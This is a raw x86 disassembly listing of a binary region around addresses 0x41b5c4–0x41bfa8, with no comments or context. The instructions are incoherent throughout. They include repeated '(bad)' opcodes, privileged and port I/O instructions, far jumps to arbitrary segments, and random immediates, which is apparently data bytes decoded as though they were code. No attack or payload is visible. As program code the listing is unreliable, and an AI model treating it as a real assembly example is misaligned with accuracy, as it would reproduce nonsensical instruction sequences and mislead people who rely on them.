  41b5c4:	fisub  DWORD PTR [edi]
  41b5c6:	add    DWORD PTR [eax],eax
  41b5c8:	test   BYTE PTR [eax],0x0
  41b5cb:	add    bl,ch
  41b5cd:	dec    ebp
  41b5ce:	pop    ebx
  41b5cf:	stos   DWORD PTR es:[edi],eax
  41b5d0:	inc    eax
  41b5d1:	xlat   BYTE PTR ds:[ebx]
  41b5d2:	ficomp WORD PTR [ecx]
  41b5d4:	les    ecx,FWORD PTR [ebx]
  41b5d6:	mov    al,0x3d
  41b5d8:	iret   
  41b5d9:	fdivr  QWORD PTR [esi]
  41b5db:	pop    DWORD PTR [edi+0x6f]
  41b5de:	daa    
  41b5df:	jb     0x41b5ce
  41b5e1:	jne    0x41b5fd
  41b5e3:	inc    ebx
  41b5e4:	add    BYTE PTR [edi+0x1],dh
  41b5e7:	jmp    0xd8f9:0x1c746151
  41b5ee:	add    BYTE PTR [ebx+0x2674e054],cl
  41b5f4:	rcl    DWORD PTR [eax-0x1b],1
  41b5f7:	push   ebx
  41b5f8:	rcl    BYTE PTR [ecx],cl
  41b5fa:	and    al,0x9
  41b5fc:	mov    bh,0xcb
  41b5fe:	out    0xbc,al
  41b600:	xchg   ecx,eax
  41b601:	les    esp,FWORD PTR [ecx]
  41b603:	xchg   esp,eax
  41b604:	hlt    
  41b605:	push   esi
  41b606:	and    ecx,ebx
  41b608:	int    0x8e
  41b60a:	sbb    ecx,DWORD PTR [edx+0x3d]
  41b60d:	and    ebx,ecx
  41b60f:	nop    DWORD PTR [ecx-0x8]
  41b613:	mov    ch,0xd1
  41b615:	fisttp QWORD PTR ds:0x6dccf26d
  41b61b:	outs   dx,DWORD PTR ds:[esi]
  41b61c:	mov    ebx,0x743917b9
  41b621:	jo     0x41b5ef
  41b623:	fwait
  41b624:	sbb    al,0x79
  41b626:	xlat   BYTE PTR ds:[ebx]
  41b627:	sub    ecx,0x6bf50fc5
  41b62d:	jmp    0xa4e6:0x907a45bc
  41b634:	je     0x41b5ea
  41b636:	pop    ss
  41b637:	inc    edx
  41b638:	xor    DWORD PTR [ebx],ecx
  41b63a:	popf   
  41b63b:	ret    0xd5b8
  41b63e:	outs   dx,BYTE PTR ds:[esi]
  41b63f:	sti    
  41b640:	js     0x41b65c
  41b642:	in     eax,dx
  41b643:	dec    esi
  41b644:	lock xor ecx,esi
  41b647:	in     eax,0xc3
  41b649:	push   es
  41b64a:	ins    DWORD PTR es:[edi],dx
  41b64b:	outs   dx,BYTE PTR ds:[esi]
  41b64c:	or     eax,0x8f06821f
  41b651:	mov    bl,BYTE PTR [ebp-0x6]
  41b654:	pop    esi
  41b655:	xchg   BYTE PTR [edi+edi*2],dh
  41b658:	sbb    al,0x48
  41b65a:	adc    al,0x4d
  41b65c:	mov    ecx,0xcefb05d5
  41b661:	sub    al,0xf4
  41b663:	and    bh,0xc1
  41b666:	je     0x41b65d
  41b668:	mul    bh
  41b66a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b66b:	(bad)  
  41b66c:	in     al,dx
  41b66d:	and    BYTE PTR [esi+edx*4+0x1d],dh
  41b671:	xor    eax,0x7a709d4
  41b676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b677:	inc    edi
  41b678:	xchg   ebx,eax
  41b679:	ins    DWORD PTR es:[edi],dx
  41b67a:	sbb    eax,0xb1e838df
  41b67f:	cld    
  41b680:	retf   
  41b681:	lahf   
  41b682:	add    eax,0xcfa0d51
  41b687:	push   ss
  41b688:	stos   DWORD PTR es:[edi],eax
  41b689:	outs   dx,DWORD PTR ds:[esi]
  41b68a:	aam    0xb8
  41b68c:	lods   eax,DWORD PTR ds:[esi]
  41b68d:	scas   al,BYTE PTR es:[edi]
  41b68e:	mov    ebx,0x485359b6
  41b693:	push   esi
  41b694:	xchg   edi,eax
  41b695:	inc    esi
  41b696:	add    BYTE PTR [edi],bl
  41b698:	cmp    al,0xb1
  41b69a:	jne    0x41b630
  41b69c:	mov    ds:0x1e543511,al
  41b6a1:	push   edx
  41b6a2:	ret    
  41b6a3:	mov    edx,0x9f88f810
  41b6a8:	jge    0x41b665
  41b6aa:	cld    
  41b6ab:	push   cs
  41b6ac:	je     0x41b6fe
  41b6ae:	xchg   ebx,eax
  41b6af:	jmp    0x88bc:0x302281fa
  41b6b6:	aam    0xa3
  41b6b8:	test   DWORD PTR [eax+ebp*8+0x0],ebp
  41b6bc:	adc    eax,0x97e184d5
  41b6c1:	add    BYTE PTR es:[eax],al
	...
  41b734:	repz xchg edi,eax
  41b736:	jae    0x41b6bf
  41b738:	ja     0x41b721
  41b73a:	div    edi
  41b73c:	dec    eax
  41b73d:	lods   eax,DWORD PTR ds:[esi]
  41b73e:	push   es
  41b73f:	mov    BYTE PTR [esi],ch
  41b741:	sub    eax,0x28d06049
  41b746:	add    DWORD PTR [eax],eax
  41b748:	test   BYTE PTR [eax],0x0
  41b74b:	add    BYTE PTR [ebp-0x54059451],bl
  41b751:	jbe    0x41b6f5
  41b753:	ret    
  41b754:	gs cmp ebx,ecx
  41b757:	fcomp  DWORD PTR [ebx]
  41b759:	imul   ebx,edx,0xffffffb5
  41b75c:	mov    ecx,cs
  41b75e:	das    
  41b75f:	jmp    0xc6b94a1e
  41b764:	retf   
  41b765:	add    BYTE PTR [ebp-0xe9e28fa],cl
  41b76b:	and    eax,0x9a708e70
  41b770:	mov    cl,dl
  41b772:	pop    ds
  41b773:	xchg   ecx,eax
  41b774:	pop    esp
  41b775:	xchg   esi,eax
  41b776:	xchg   esp,eax
  41b777:	add    al,0x52
  41b779:	fidivr DWORD PTR [ebp-0x3a]
  41b77c:	rcl    BYTE PTR [edx+0x512214c7],0x8
  41b783:	mov    al,ds:0xee69521d
  41b788:	fimul  DWORD PTR [eax-0x80]
  41b78b:	ffree  st(2)
  41b78d:	iret   
  41b78e:	xchg   DWORD PTR [eax],edi
  41b790:	push   0x8ae2d9d7
  41b795:	add    esi,DWORD PTR [edx]
  41b797:	and    bh,BYTE PTR [ebx-0x1d]
  41b79a:	mov    esi,0xfeca2000
  41b79f:	jge    0x41b790
  41b7a1:	push   0xb9fa56b7
  41b7a6:	push   es
  41b7a7:	add    eax,0x5a8abc6a
  41b7ac:	in     al,0x1b
  41b7ae:	shr    BYTE PTR [edi+0x16],0x3a
  41b7b2:	adc    al,0x8
  41b7b4:	loop   0x41b789
  41b7b6:	cmp    BYTE PTR ds:0x62023462,ch
  41b7bc:	pop    eax
  41b7bd:	sbb    BYTE PTR [esi-0x24cd637c],ch
  41b7c3:	inc    esp
  41b7c4:	call   0x4892ce1d
  41b7c9:	icebp  
  41b7ca:	shl    BYTE PTR [esi+esi*8-0x2ff0f6c4],0x4d
  41b7d2:	adc    ebp,DWORD PTR [ecx]
  41b7d4:	and    al,0xff
  41b7d6:	cmp    al,0x74
  41b7d8:	and    BYTE PTR [ecx-0xb],cl
  41b7db:	pop    esp
  41b7dc:	(bad)  
  41b7dd:	je     0x41b7f9
  41b7df:	shr    bh,0x28
  41b7e2:	or     DWORD PTR [ecx+0x7e],0x2a6def24
  41b7e9:	mov    bl,0x5e
  41b7eb:	repz and al,0x74
  41b7ee:	int3   
  41b7ef:	xchg   ebp,eax
  41b7f0:	adc    al,bl
  41b7f2:	in     eax,dx
  41b7f3:	pop    ebp
  41b7f4:	add    bl,BYTE PTR [ebx]
  41b7f6:	retf   0x93a8
  41b7f9:	xlat   BYTE PTR ds:[ebx]
  41b7fa:	out    0xaf,al
  41b7fc:	shl    cl,1
  41b7fe:	xchg   esp,eax
  41b7ff:	(bad)  
  41b800:	ss cwde 
  41b802:	pop    ds
  41b803:	mov    BYTE PTR [edi],ah
  41b805:	mov    ecx,0x4b32426
  41b80a:	adc    eax,0x39013d94
  41b80f:	out    0x87,al
  41b811:	jo     0x41b818
  41b813:	cmp    eax,0x8616f69b
  41b818:	pop    ecx
  41b819:	mov    BYTE PTR [edi*2-0x21414461],dh
  41b820:	lods   eax,DWORD PTR ds:[esi]
  41b821:	int    0x85
  41b823:	mov    eax,0xc265ee4b
  41b828:	push   es
  41b829:	jno    0x41b866
  41b82b:	mov    ebp,0xebb045f4
  41b830:	fs jno 0x41b7ef
  41b833:	mov    esi,0x567cb5aa
  41b838:	(bad)  
  41b839:	(bad)  
  41b83a:	icebp  
  41b83b:	sbb    ch,BYTE PTR [edx+0x7f]
  41b83e:	and    bl,ch
  41b840:	ret    
  41b841:	and    eax,0x0
	...
  41b8b2:	add    BYTE PTR [eax],al
  41b8b4:	xor    eax,0xcf4a867e
  41b8b9:	cli    
  41b8ba:	std    
  41b8bb:	jg     0x41b85c
  41b8bd:	into   
  41b8be:	jno    0x41b916
  41b8c0:	mov    eax,ds:0xc6359d41
  41b8c5:	sub    DWORD PTR [ecx],eax
  41b8c7:	add    dh,dh
  41b8c9:	add    BYTE PTR [eax],al
  41b8cb:	add    BYTE PTR [esi],ah
  41b8cd:	dec    ecx
  41b8ce:	add    dl,BYTE PTR [edi+0x4]
  41b8d1:	mov    ds:0x832530ab,al
  41b8d6:	push   ds
  41b8d7:	test   BYTE PTR [esp+eiz*2-0x3bffdcd9],cl
  41b8de:	pop    esp
  41b8df:	push   eax
  41b8e0:	jns    0x41b88a
  41b8e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8e3:	scas   al,BYTE PTR es:[edi]
  41b8e4:	sbb    eax,0xafa1f112
  41b8e9:	sub    BYTE PTR [ebx],0x67
  41b8ec:	int    0x54
  41b8ee:	ss mov esp,0x1a09fcee
  41b8f4:	mov    ch,BYTE PTR [edx]
  41b8f6:	sub    BYTE PTR [ebp-0x423540d3],bh
  41b8fc:	xor    BYTE PTR [eax+0x7782a5d8],al
  41b902:	jbe    0x41b94a
  41b904:	repnz cmp ch,BYTE PTR [eax]
  41b907:	inc    esp
  41b908:	(bad)  
  41b909:	cmp    eax,0x7f7c1192
  41b90e:	cmp    esp,DWORD PTR [esi+0x7a]
  41b911:	cmp    eax,0x4eae9efb
  41b916:	pop    esi
  41b917:	mov    cs,WORD PTR [esi+0x66]
  41b91a:	lods   eax,DWORD PTR ds:[esi]
  41b91b:	(bad)  ss:[esi-0x7d]
  41b91f:	mov    ebx,0x1b50294
  41b924:	xor    edi,DWORD PTR [ecx]
  41b926:	out    0x8f,al
  41b928:	dec    ecx
  41b929:	sub    dl,BYTE PTR [ecx]
  41b92b:	or     edx,esi
  41b92d:	mov    BYTE PTR [ebp-0x37351459],ch
  41b933:	ins    BYTE PTR es:[edi],dx
  41b934:	and    al,0xfb
  41b936:	cmp    al,0x60
  41b938:	in     eax,0x47
  41b93a:	sub    BYTE PTR [ebp+ebx*8-0x1771975e],0x40
  41b942:	das    
  41b943:	push   ebx
  41b944:	hlt    
  41b945:	sub    eax,0x32adb110
  41b94a:	test   edi,0xaea95685
  41b950:	jg     0x41b8ec
  41b952:	add    BYTE PTR [edi-0x68],dl
  41b955:	push   eax
  41b956:	push   ds
  41b957:	dec    eax
  41b958:	xor    DWORD PTR [ebx],esp
  41b95a:	dec    eax
  41b95b:	sahf   
  41b95c:	enterw 0xf0d6,0xa
  41b961:	(bad)  
  41b962:	ja     0x41b909
  41b964:	je     0x41b975
  41b966:	lods   eax,DWORD PTR ds:[esi]
  41b967:	leave  
  41b968:	stc    
  41b969:	outs   dx,BYTE PTR ds:[esi]
  41b96a:	mov    bl,0xd
  41b96c:	dec    edx
  41b96d:	sti    
  41b96e:	sub    al,0x7b
  41b970:	out    0x30,eax
  41b972:	(bad)  
  41b973:	fistp  QWORD PTR [ebp-0x1e863ffd]
  41b979:	cmp    BYTE PTR [eax+0x58],dl
  41b97c:	xlat   BYTE PTR ds:[ebx]
  41b97d:	mov    ebx,0x4d1c44fd
  41b982:	sub    BYTE PTR [edi+0x1558b3c1],ah
  41b988:	es scas al,BYTE PTR es:[edi]
  41b98a:	jno    0x41b9c9
  41b98c:	aad    0x45
  41b98e:	cwde   
  41b98f:	sbb    ah,BYTE PTR [edi+0x6ecdddf4]
  41b995:	ss mov eax,fs
  41b998:	xor    eax,0xe4126b77
  41b99d:	(bad)  
  41b99e:	sbb    DWORD PTR [eax+edx*2],esi
  41b9a1:	test   BYTE PTR [eax+esi*2+0xe],ch
  41b9a5:	les    eax,FWORD PTR [edi-0x45]
  41b9a8:	(bad)  
  41b9a9:	jmp    0x971f:0x973c841d
  41b9b0:	add    al,0xc0
  41b9b2:	push   ds
  41b9b3:	dec    esi
  41b9b4:	mov    esi,0xde883e5e
  41b9b9:	inc    esi
  41b9ba:	in     eax,0xc9
  41b9bc:	es jp  0x41b9c5
  41b9bf:	inc    ecx
  41b9c0:	stos   DWORD PTR es:[edi],eax
  41b9c1:	add    BYTE PTR ss:[eax],al
	...
  41ba34:	test   DWORD PTR [ecx],0xfdfeb4dc
  41ba3a:	inc    DWORD PTR [ebx-0x11]
  41ba3d:	sub    ecx,DWORD PTR [edx]
  41ba3f:	pop    edi
  41ba40:	(bad)  
  41ba41:	das    
  41ba42:	(bad)  [esp+edi*4]
  41ba45:	sub    al,BYTE PTR [ecx]
  41ba47:	add    dh,dh
  41ba49:	add    BYTE PTR [eax],al
  41ba4b:	add    BYTE PTR [eax-0x75],bh
  41ba4e:	gs inc ebx
  41ba50:	in     eax,0xfd
  41ba52:	ret    
  41ba53:	inc    esp
  41ba54:	add    eax,0x8d83ef17
  41ba59:	out    0x35,eax
  41ba5b:	fcmove st,st(4)
  41ba5d:	and    edx,eax
  41ba5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba60:	sub    DWORD PTR [esi],esi
  41ba62:	and    DWORD PTR [ebp+0xc],edx
  41ba65:	sbb    al,0x40
  41ba67:	xor    eax,0x50ee14cd
  41ba6c:	adc    cl,al
  41ba6e:	push   edi
  41ba6f:	inc    ecx
  41ba70:	or     esp,esp
  41ba72:	in     al,0x77
  41ba74:	mov    bl,0xcb
  41ba76:	xchg   ebx,eax
  41ba77:	inc    edi
  41ba78:	push   edx
  41ba79:	cwde   
  41ba7a:	dec    eax
  41ba7b:	(bad)  
  41ba7c:	(bad)  
  41ba7d:	mov    ecx,0xc9d0281b
  41ba82:	sbb    eax,0xc1357c24
  41ba87:	jb     0x41bad9
  41ba89:	aaa    
  41ba8a:	lea    ebp,ds:0x295d19ad
  41ba90:	int    0x31
  41ba92:	or     al,0xe4
  41ba94:	stc    
  41ba95:	ret    
  41ba96:	sbb    esi,DWORD PTR [ecx+ebp*1]
  41ba99:	sub    DWORD PTR [esi],ebx
  41ba9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba9c:	pop    es
  41ba9d:	sub    DWORD PTR [esi+eiz*1+0x34],esi
  41baa1:	dec    esp
  41baa2:	push   ebx
  41baa3:	sub    BYTE PTR [edx+0x692af188],0x46
  41baaa:	dec    ebx
  41baab:	(bad)
  41baae:	push   ss
  41baaf:	dec    esp
  41bab0:	(bad)
  41bab3:	mov    esp,0xc1cb4b11
  41bab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bab9:	and    BYTE PTR [esi],dh
  41babb:	aaa    
  41babc:	push   ebp
  41babd:	jo     0x41bad6
  41babf:	fcomp  DWORD PTR ds:0x852ddc3a
  41bac5:	idiv   DWORD PTR [edi]
  41bac7:	or     bl,0xb
  41baca:	add    eax,0xabc43a76
  41bacf:	jle    0x41ba89
  41bad1:	sbb    esp,DWORD PTR [ebp-0x5e]
  41bad4:	imul   edi,DWORD PTR [edx-0xf],0x9
  41bad8:	cmp    eax,0x5d971f6
  41badd:	dec    edx
  41bade:	sub    BYTE PTR [eax+0x6e5abd6c],cl
  41bae4:	add    esi,DWORD PTR [edi]
  41bae6:	lods   eax,DWORD PTR ds:[esi]
  41bae7:	fadd   st,st(5)
  41bae9:	out    dx,eax
  41baea:	call   0x1eac49fc
  41baef:	dec    esp
  41baf0:	ja     0x41bb05
  41baf2:	dec    edi
  41baf3:	cs or  eax,0xc61d0f67
  41baf9:	pop    ecx
  41bafa:	jnp    0x41bb06
  41bafc:	popf   
  41bafd:	nop
  41bafe:	push   cs
  41baff:	mov    edi,0xa05e5a2a
  41bb04:	sbb    DWORD PTR [eax],eax
  41bb06:	into   
  41bb07:	inc    esi
  41bb08:	xchg   esi,eax
  41bb09:	aam    0xc2
  41bb0b:	imul   ebp,DWORD PTR [ecx+eax*1-0x65],0x897636a2
  41bb13:	aam    0x7c
  41bb15:	test   DWORD PTR [ebx],ebp
  41bb17:	retf   0x36b9
  41bb1a:	mov    ebp,0x8d4fd1ac
  41bb1f:	cmp    BYTE PTR [esi],dh
  41bb21:	jge    0x41bb48
  41bb23:	xchg   esi,eax
  41bb24:	lods   eax,DWORD PTR ds:[esi]
  41bb25:	lock mov dh,0x5d
  41bb28:	addr16 jg 0x41bb39
  41bb2b:	pop    ss
  41bb2c:	inc    edi
  41bb2d:	sbb    edi,ebx
  41bb2f:	mov    dh,0xe5
  41bb31:	sbb    cl,BYTE PTR [edi]
  41bb33:	xor    eax,0xff7a9072
  41bb38:	nop
  41bb39:	mov    ds,ebx
  41bb3b:	lock jmp 0x41bb40
  41bb3e:	xor    dl,BYTE PTR [edx]
  41bb40:	sbb    BYTE PTR [ebx],bl
	...
  41bbb2:	add    BYTE PTR [eax],al
  41bbb4:	push   0x49
  41bbb6:	es cmp al,0x27
  41bbb9:	jg     0x41bc35
  41bbbb:	pop    edi
  41bbbc:	xor    DWORD PTR [edx+edi*2],0x3a
  41bbc0:	and    eax,0xb2df7a47
  41bbc5:	sub    eax,DWORD PTR [ecx]
  41bbc7:	add    dh,dh
  41bbc9:	add    BYTE PTR [eax],al
  41bbcb:	add    BYTE PTR [eax],ch
  41bbcd:	imul   esp,eax,0x66
  41bbd0:	outs   dx,DWORD PTR ds:[esi]
  41bbd1:	test   DWORD PTR cs:[esi-0x6b],0xacd213e5
  41bbd9:	push   0xd
  41bbdb:	icebp  
  41bbdc:	jo     0x41bb70
  41bbde:	mov    dl,0x48
  41bbe0:	sub    edi,DWORD PTR [edi]
  41bbe2:	add    dl,BYTE PTR [edi+0x3e]
  41bbe5:	inc    edi
  41bbe6:	mov    al,dh
  41bbe8:	les    ebx,FWORD PTR [ecx+0x1f29d997]
  41bbee:	inc    esi
  41bbef:	in     al,dx
  41bbf0:	hlt    
  41bbf1:	test   DWORD PTR [edx],edi
  41bbf3:	ret    
  41bbf4:	mov    cs,WORD PTR [edi+ebx*4-0x547236e]
  41bbfb:	test   eax,0x11bf7978
  41bc00:	cdq    
  41bc01:	cmp    ah,bl
  41bc03:	or     edx,DWORD PTR ds:0x68a0f52d
  41bc09:	cmp    eax,0x63702e95
  41bc0e:	idiv   BYTE PTR [eax]
  41bc10:	xor    ecx,eax
  41bc12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc13:	addr16 inc ebp
  41bc15:	scas   al,BYTE PTR es:[edi]
  41bc16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc17:	sahf   
  41bc18:	mov    cl,0x58
  41bc1a:	popf   
  41bc1b:	add    eax,0xc2f8beff
  41bc20:	es std 
  41bc22:	and    al,0x61
  41bc24:	repz div DWORD PTR [edi]
  41bc27:	fcmove st,st(3)
  41bc29:	inc    eax
  41bc2a:	cmp    eax,esp
  41bc2c:	call   0x6c10:0xcbafe096
  41bc33:	cmp    eax,0x60f198a7
  41bc38:	das    
  41bc39:	jl     0x41bbbc
  41bc3b:	pop    eax
  41bc3c:	pop    esp
  41bc3d:	outs   dx,WORD PTR ds:[esi]
  41bc3f:	pushf  
  41bc40:	sbb    DWORD PTR [ebp-0x1b38a2be],eax
  41bc46:	pop    DWORD PTR [edx]
  41bc48:	cmp    ch,ah
  41bc4a:	in     al,0x33
  41bc4c:	and    BYTE PTR [edi],al
  41bc4e:	and    esi,esi
  41bc50:	js     0x41bcb9
  41bc52:	les    esi,FWORD PTR [ebp+0x4d]
  41bc55:	cmp    al,0xad
  41bc57:	xor    eax,0xb1613003
  41bc5c:	gs pop eax
  41bc5e:	mov    ds:0xd7ac5025,eax
  41bc63:	scas   al,BYTE PTR es:[edi]
  41bc64:	in     al,0xaf
  41bc66:	ret    
  41bc67:	sbb    BYTE PTR [edx],dl
  41bc69:	pop    ebx
  41bc6a:	pushf  
  41bc6b:	jns    0x41bce5
  41bc6d:	xor    esp,esp
  41bc6f:	jo     0x41bc9e
  41bc71:	jnp    0x41bcbe
  41bc73:	test   al,0x57
  41bc75:	mov    ch,dh
  41bc77:	sub    al,0xa3
  41bc79:	inc    cx
  41bc7b:	xor    dh,dl
  41bc7d:	add    eax,0x6596c53e
  41bc82:	push   cs
  41bc83:	dec    ebp
  41bc84:	mov    esi,0x344c066f
  41bc89:	lods   al,BYTE PTR ds:[esi]
  41bc8a:	jmp    0x41bc9c
  41bc8c:	addr16 jmp 0x22084061
  41bc92:	out    dx,al
  41bc93:	push   esp
  41bc94:	xor    al,0x67
  41bc96:	sub    eax,0x9eaf4da5
  41bc9b:	out    0x9f,al
  41bc9d:	cdq    
  41bc9e:	cmp    ch,cl
  41bca0:	shr    dl,0x16
  41bca3:	xchg   edi,eax
  41bca4:	fs xchg edi,eax
  41bca6:	mov    DWORD PTR [edi+0x61],edx
  41bca9:	call   0x27085cd2
  41bcae:	stos   DWORD PTR es:[edi],eax
  41bcaf:	in     al,0x9d
  41bcb1:	xchg   ebx,eax
  41bcb2:	push   edi
  41bcb3:	inc    ecx
  41bcb4:	fsubr  QWORD PTR [edi+0x3b]
  41bcb7:	add    al,0x2a
  41bcb9:	bound  eax,QWORD PTR [ecx]
  41bcbb:	icebp  
  41bcbc:	outs   dx,DWORD PTR ds:[esi]
  41bcbd:	sbb    dh,0x5d
  41bcc0:	data16 add BYTE PTR fs:[eax],al
	...
  41bd34:	push   ebp
  41bd35:	clc    
  41bd36:	or     DWORD PTR [esi-0x4280053],ebx
  41bd3c:	cmp    eax,0x4bf1c9a
  41bd41:	and    dl,ah
  41bd43:	(bad)  [eax-0x9fffed4]
  41bd49:	add    BYTE PTR [eax],al
  41bd4b:	add    BYTE PTR [ebx],bl
  41bd4d:	mov    ch,0x80
  41bd4f:	sbb    al,0x79
  41bd51:	mov    cl,0x75
  41bd53:	xchg   edi,eax
  41bd54:	push   0xaac57c71
  41bd59:	in     eax,dx
  41bd5a:	imul   ecx,DWORD PTR ds:0xac31de7e,0x2f
  41bd61:	aam    0x7
  41bd63:	adc    DWORD PTR [di-0x616e],ebx
  41bd68:	cmp    DWORD PTR [ebx+0x4382a524],eax
  41bd6e:	sahf   
  41bd6f:	jge    0x41bda0
  41bd71:	clc    
  41bd72:	inc    esi
  41bd73:	in     al,0x90
  41bd75:	ret    
  41bd76:	data16 cmc 
  41bd78:	ins    DWORD PTR es:[edi],dx
  41bd79:	add    BYTE PTR [ecx],bl
  41bd7b:	adc    al,0x30
  41bd7d:	pop    esp
  41bd7e:	push   0x414020f6
  41bd83:	sar    DWORD PTR [edx+edi*4-0x5d180c4a],1
  41bd8a:	dec    esp
  41bd8b:	mov    esp,0xc065cb56
  41bd90:	out    dx,al
  41bd91:	bound  esp,QWORD PTR [ebx+0x1942d75f]
  41bd97:	jg     0x41bd1f
  41bd99:	popa   
  41bd9a:	mov    ds:0x9bc0712d,eax
  41bd9f:	out    dx,eax
  41bda0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bda1:	dec    edx
  41bda2:	js     0x41bd72
  41bda4:	jae    0x41bd8d
  41bda6:	inc    esi
  41bda7:	out    dx,al
  41bda8:	aas    
  41bda9:	add    ebp,0xffffffbe
  41bdac:	push   cs
  41bdad:	push   0x884a691e
  41bdb2:	test   eax,0x6f657146
  41bdb7:	or     al,0x52
  41bdb9:	jns    0x41be18
  41bdbb:	and    bl,dh
  41bdbd:	adc    eax,0xfd0ba4e1
  41bdc2:	push   ebp
  41bdc3:	mov    gs,WORD PTR [ebx-0x7a]
  41bdc6:	es (bad) 
  41bdc9:	adc    cl,BYTE PTR [ebx]
  41bdcb:	pushf  
  41bdcc:	xchg   BYTE PTR [ecx+ebp*4],ah
  41bdcf:	or     BYTE PTR [edi],0xd7
  41bdd2:	cmp    cl,ch
  41bdd4:	shr    DWORD PTR [edi+0x4b70b3a4],0x3
  41bddb:	arpl   WORD PTR [eax],ax
  41bddd:	xchg   ebp,eax
  41bdde:	dec    edx
  41bddf:	xchg   BYTE PTR [eax+0x2bdac100],bl
  41bde5:	cmp    eax,ebx
  41bde7:	test   eax,0x7c62d2b1
  41bdec:	push   esi
  41bded:	div    BYTE PTR [ebp+0xe]
  41bdf0:	and    BYTE PTR [eax],bh
  41bdf2:	pusha  
  41bdf3:	pop    ds
  41bdf4:	mov    ch,0x81
  41bdf6:	test   al,0xb8
  41bdf8:	sahf   
  41bdf9:	repnz mov edx,0xe437f083
  41bdff:	stos   BYTE PTR es:[edi],al
  41be00:	xor    ebp,edx
  41be02:	inc    eax
  41be03:	sub    al,0x58
  41be05:	ss popa 
  41be07:	adc    ch,0xcd
  41be0a:	add    al,BYTE PTR [edi-0x4ddf3473]
  41be10:	jns    0x41be3a
  41be12:	mov    DWORD PTR [ebp+0x239d3b89],0x691ae6ca
  41be1c:	mov    ?,WORD PTR [eax+0x5ff8e30]
  41be22:	and    dl,BYTE PTR [ecx+ebx*1]
  41be25:	pop    ecx
  41be26:	fs ins BYTE PTR es:[edi],dx
  41be28:	push   es
  41be29:	je     0x41be5f
  41be2b:	xchg   ah,al
  41be2d:	scas   al,BYTE PTR es:[edi]
  41be2e:	push   eax
  41be2f:	or     eax,0x6ed21256
  41be34:	or     ecx,edi
  41be36:	neg    eax
  41be38:	xchg   edi,eax
  41be39:	push   ebp
  41be3a:	add    eax,0xbb4b9154
  41be3f:	adc    dh,0x5e
	...
  41beb2:	add    BYTE PTR [eax],al
  41beb4:	(bad)  
  41beb7:	xor    edi,DWORD PTR [ebp-0x57002089]
  41bebd:	ja     0x41bf3b
  41bebf:	cmovnp esp,ebx
  41bec2:	sbb    ebp,DWORD PTR [ebp-0x62]
  41bec5:	sub    eax,0xf60001
  41beca:	add    BYTE PTR [eax],al
  41becc:	xchg   ebx,eax
  41becd:	xor    al,0x60
  41becf:	push   ecx
  41bed0:	ja     0x41be9f
  41bed2:	in     eax,0xc5
  41bed4:	(bad)  
  41bed5:	ret    
  41bed6:	or     al,0xa1
  41bed8:	push   es
  41bed9:	push   esi
  41beda:	(bad)  
  41bedd:	inc    ebx
  41bede:	les    ebx,FWORD PTR [eax]
  41bee0:	mov    edi,0x8932071a
  41bee5:	cmp    BYTE PTR [esp+ebx*8-0x20],dl
  41bee9:	push   ecx
  41beea:	in     al,dx
  41beeb:	add    edi,DWORD PTR [ebx]
  41beed:	and    al,ah
  41beef:	cmc    
  41bef0:	push   eax
  41bef1:	adc    eax,0xfb0736b2
  41bef6:	fwait
  41bef7:	dec    esi
  41bef8:	fwait
  41bef9:	mov    fs,eax
  41befb:	mov    ebx,0x15a6fb7
  41bf00:	mov    edi,0x2bf851a3
  41bf05:	fimul  WORD PTR [edi-0x7ed71ba0]
  41bf0b:	retf   
  41bf0c:	cmc    
  41bf0d:	shr    ebx,0x9
  41bf10:	or     ebx,DWORD PTR [ebp+0x78151040]
  41bf16:	add    al,0xc2
  41bf18:	or     al,0x30
  41bf1a:	imul   BYTE PTR [eax+0x63]
  41bf1d:	cwde   
  41bf1e:	test   eax,0xee196c39
  41bf23:	lods   al,BYTE PTR es:[esi]
  41bf25:	xchg   edx,eax
  41bf26:	mov    eax,ds:0x59e469d6
  41bf2b:	lods   eax,DWORD PTR ds:[esi]
  41bf2c:	xchg   edx,eax
  41bf2d:	fisubr DWORD PTR [edx+0x26]
  41bf30:	enter  0x3946,0x82
  41bf34:	nop
  41bf35:	pop    ebx
  41bf36:	ret    0x65f1
  41bf39:	cmp    eax,0xffffff9a
  41bf3c:	mov    al,0x2d
  41bf3e:	(bad)  
  41bf3f:	in     eax,0x49
  41bf41:	add    bl,BYTE PTR [ecx]
  41bf43:	sbb    al,0x5a
  41bf45:	sbb    ah,BYTE PTR [esi]
  41bf47:	jecxz  0x41bf9d
  41bf49:	lods   eax,DWORD PTR ds:[esi]
  41bf4a:	sub    BYTE PTR ds:0x8827bf03,bh
  41bf50:	sbb    DWORD PTR [edx-0x30],edx
  41bf53:	xlat   BYTE PTR ds:[ebx]
  41bf55:	xchg   ebp,eax
  41bf56:	or     esp,DWORD PTR [edi-0x60d9a477]
  41bf5c:	mov    ds:0x46266615,al
  41bf61:	xor    BYTE PTR [ebx],al
  41bf63:	test   al,0xf4
  41bf65:	sub    eax,0x75612fb0
  41bf6a:	sbb    bh,BYTE PTR [ebx-0xa]
  41bf6d:	push   esi
  41bf6e:	xor    ebx,eax
  41bf70:	ja     0x41bfce
  41bf72:	aad    0x29
  41bf74:	xchg   edx,eax
  41bf75:	and    eax,0x9b376941
  41bf7a:	and    dh,BYTE PTR [edi+0x2b015ed0]
  41bf80:	add    edx,DWORD PTR [esi-0x68f25386]
  41bf86:	mov    DWORD PTR [edi+0x28],ebp
  41bf89:	inc    edx
  41bf8a:	jne    0x41bf9b
  41bf8c:	inc    esi
  41bf8d:	or     DWORD PTR [ebp+0x1d],edx
  41bf90:	xlat   BYTE PTR ds:[ebx]
  41bf91:	or     ebx,ebp
  41bf93:	dec    edi
  41bf94:	or     DWORD PTR [ebx-0x32],ebp
  41bf97:	aad    0x8f
  41bf99:	cmp    DWORD PTR [edx+0x17],eax
  41bf9c:	lods   eax,DWORD PTR ds:[esi]
  41bf9d:	(bad)  
  41bf9e:	mov    dl,0x84
  41bfa0:	fisttp QWORD PTR [ebx+eax*8-0x7bc96f21]
  41bfa7:	int3   
  41bfa8:	xor    eax,0x2e016731
